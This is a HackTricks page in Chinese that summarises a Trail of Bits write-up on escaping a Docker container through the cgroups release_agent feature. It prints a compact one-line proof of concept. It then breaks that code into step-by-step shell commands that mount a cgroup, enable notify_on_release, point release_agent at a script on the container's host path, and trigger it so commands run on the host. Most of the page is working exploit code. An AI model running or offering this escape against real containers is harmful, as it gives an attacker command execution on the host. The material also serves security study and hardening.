# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**有关更多详细信息，请参阅** [**原始博客文章**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**。** 这只是一个摘要：

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
概念验证（PoC）演示了一种通过创建 `release_agent` 文件并触发其调用以在容器主机上执行任意命令来利用 cgroups 的方法。以下是涉及的步骤细分：

1. **准备环境：**
- 创建一个目录 `/tmp/cgrp` 作为 cgroup 的挂载点。
- 将 RDMA cgroup 控制器挂载到该目录。如果 RDMA 控制器不存在，建议使用 `memory` cgroup 控制器作为替代。
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **设置子 Cgroup：**
- 在挂载的 cgroup 目录中创建一个名为 "x" 的子 cgroup。
- 通过向其 notify_on_release 文件写入 1 来为 "x" cgroup 启用通知。
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **配置释放代理：**
- 从 /etc/mtab 文件中获取主机上容器的路径。
- 然后将 cgroup 的 release_agent 文件配置为执行位于获取的主机路径上的名为 /cmd 的脚本。
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **创建和配置 /cmd 脚本：**
- /cmd 脚本在容器内创建，并配置为执行 ps aux，将输出重定向到容器中的一个名为 /output 的文件。指定了主机上 /output 的完整路径。
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **触发攻击：**
- 在 "x" 子 cgroup 内启动一个进程，并立即终止。
- 这会触发 `release_agent`（/cmd 脚本），该脚本在主机上执行 ps aux 并将输出写入容器内的 /output。
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
